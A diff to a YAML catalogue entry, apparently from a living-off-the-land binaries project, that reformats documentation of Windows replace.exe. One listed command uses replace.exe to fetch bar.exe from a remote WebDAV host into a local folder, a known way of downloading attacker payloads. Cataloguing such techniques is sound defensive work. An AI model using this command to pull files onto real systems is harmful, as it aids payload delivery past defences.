@@ -5,12 +5,13 @@ Author: ''
 Created: '2018-05-25'
 Categories: []
 Commands:
-  - Command: "replace c:\\source\\file.cab c:\\destination /A\n     \nreplace \\\\\
-      webdav.host.com\\foo\\bar.exe c:\\outdir /A"
+  - Command: replace.exe C:\Source\File.cab C:\Destination /A
+    Description: ''
+  - Command: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
     Description: ''
 Full Path:
-  - c:\windows\system32\replace.exe
-  - c:\windows\sysWOW64\replace.exe
+  - C:\Windows\System32\replace.exe
+  - C:\Windows\SysWOW64\replace.exe
 Code Sample: []
 Detection: []
 Resources:
